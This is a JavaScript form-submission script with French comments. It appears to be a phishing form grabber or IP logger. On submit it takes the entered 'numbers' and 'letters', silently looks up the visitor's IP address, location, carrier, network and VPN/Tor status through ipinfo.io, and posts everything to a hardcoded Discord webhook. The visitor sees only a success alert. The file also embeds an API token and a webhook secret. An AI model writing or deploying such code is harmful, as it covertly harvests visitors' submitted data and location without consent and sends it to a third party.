document.getElementById('myForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Récupérer les valeurs du formulaire
    const numbers = document.getElementById('numbers').value;
    const letters = document.getElementById('letters').value;

    // Récupérer les données de géolocalisation via l'API IPInfo
    fetch('https://ipinfo.io/json?token=d59cbb833f4209')
        .then(response => response.json())
        .then(data => {
            // Extraire les données de géolocalisation, y compris l'IP
            const geolocationData = {
                ip: data.ip || 'Non disponible',
                hostname: data.hostname || 'Non disponible',
                city: data.city || 'Non disponible',
                region: data.region || 'Non disponible',
                country: data.country || 'Non disponible',
                loc: data.loc || 'Non disponible',          // Latitude, Longitude
                org: data.org || 'Non disponible',
                postal: data.postal || 'Non disponible',
                timezone: data.timezone || 'Non disponible',
                is_mobile: data.is_mobile ? 'Oui' : 'Non',
                is_anonymous: data.is_anonymous ? 'Oui' : 'Non',
                is_satellite: data.is_satellite ? 'Oui' : 'Non',
                is_hosting: data.is_hosting ? 'Oui' : 'Non'
            };

            // Récupérer les informations ASN (Autonomous System Number)
            const asnData = data.asn || { asn: 'Non disponible', name: 'Non disponible', domain: 'Non disponible', route: 'Non disponible', type: 'Non disponible' };

            // Récupérer les informations de la compagnie (Company)
            const companyData = data.company || { name: 'Non disponible', domain: 'Non disponible', type: 'Non disponible' };

            // Récupérer les informations sur l'opérateur (Carrier)
            const carrierData = data.carrier || { name: 'Non disponible', mcc: 'Non disponible', mnc: 'Non disponible' };

            // Récupérer les informations de confidentialité (Privacy)
            const privacyData = data.privacy || { vpn: 'Non', proxy: 'Non', tor: 'Non', relay: 'Non', hosting: 'Non', service: 'Non disponible' };

            // Récupérer les informations sur les abus (Abuse)
            const abuseData = data.abuse || { address: 'Non disponible', country: 'Non disponible', email: 'Non disponible', name: 'Non disponible', network: 'Non disponible', phone: 'Non disponible' };

            // Créer le message à envoyer à Discord
            const discordMessage = {
                content: `Chiffres: ${numbers}\nLettres: ${letters}\n\n` +
                         `**Geolocation**\n` +
                         `IP: ${geolocationData.ip}\n` +
                         `Hostname: ${geolocationData.hostname}\n` +
                         `City: ${geolocationData.city}\n` +
                         `Region: ${geolocationData.region}\n` +
                         `Country: ${geolocationData.country}\n` +
                         `Loc: ${geolocationData.loc}\n` +
                         `Org: ${geolocationData.org}\n` +
                         `Postal: ${geolocationData.postal}\n` +
                         `Timezone: ${geolocationData.timezone}\n` +
                         `Is Mobile: ${geolocationData.is_mobile}\n` +
                         `Is Anonymous: ${geolocationData.is_anonymous}\n` +
                         `Is Satellite: ${geolocationData.is_satellite}\n` +
                         `Is Hosting: ${geolocationData.is_hosting}\n\n` +

                         `**ASN**\n` +
                         `ASN: ${asnData.asn}\n` +
                         `Name: ${asnData.name}\n` +
                         `Domain: ${asnData.domain}\n` +
                         `Route: ${asnData.route}\n` +
                         `Type: ${asnData.type}\n\n` +

                         `**Company**\n` +
                         `Name: ${companyData.name}\n` +
                         `Domain: ${companyData.domain}\n` +
                         `Type: ${companyData.type}\n\n` +

                         `**Carrier**\n` +
                         `Name: ${carrierData.name}\n` +
                         `MCC: ${carrierData.mcc}\n` +
                         `MNC: ${carrierData.mnc}\n\n` +

                         `**Privacy**\n` +
                         `VPN: ${privacyData.vpn}\n` +
                         `Proxy: ${privacyData.proxy}\n` +
                         `TOR: ${privacyData.tor}\n` +
                         `Relay: ${privacyData.relay}\n` +
                         `Hosting: ${privacyData.hosting}\n` +
                         `Service: ${privacyData.service}\n\n` +

                         `**Abuse**\n` +
                         `Address: ${abuseData.address}\n` +
                         `Country: ${abuseData.country}\n` +
                         `Email: ${abuseData.email}\n` +
                         `Name: ${abuseData.name}\n` +
                         `Network: ${abuseData.network}\n` +
                         `Phone: ${abuseData.phone}\n`
            };

            // Envoyer le message à Discord via le webhook
            fetch('https://discord.com/api/webhooks/1323163149985124362/zf-fdV2FghIr5D3n4VykFCMkwYmwm6pa1WT_1kPwsGfUzRaiFgX9EBn301sFa0KbkEZ2', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            })
            .then(response => response.json())
            .then(data => {
                alert('Formulaire envoyé avec succès !');
            })
            .catch(error => {
                alert('Erreur lors de l\'envoi du formulaire');
                console.error(error);
            });
        })
        .catch(error => {
            console.error('Erreur IPInfo:', error);
        });
});
